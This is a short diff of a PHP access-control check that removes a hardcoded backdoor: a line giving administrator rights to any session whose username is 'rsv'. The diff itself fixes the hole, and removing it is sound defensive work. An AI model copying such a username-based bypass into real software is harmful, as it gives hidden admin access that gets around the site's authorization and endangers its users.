@@ -6,7 +6,6 @@ $pdo = Database::getConnection();
 
 $username = $_SESSION['username'] ?? '';
 $isAdmin  = (bool)($_SESSION['is_admin'] ?? false);
-if ($username === 'rsv') { $isAdmin = true; }
 
 if ($username === '' || !$isAdmin) {
     http_response_code(403);
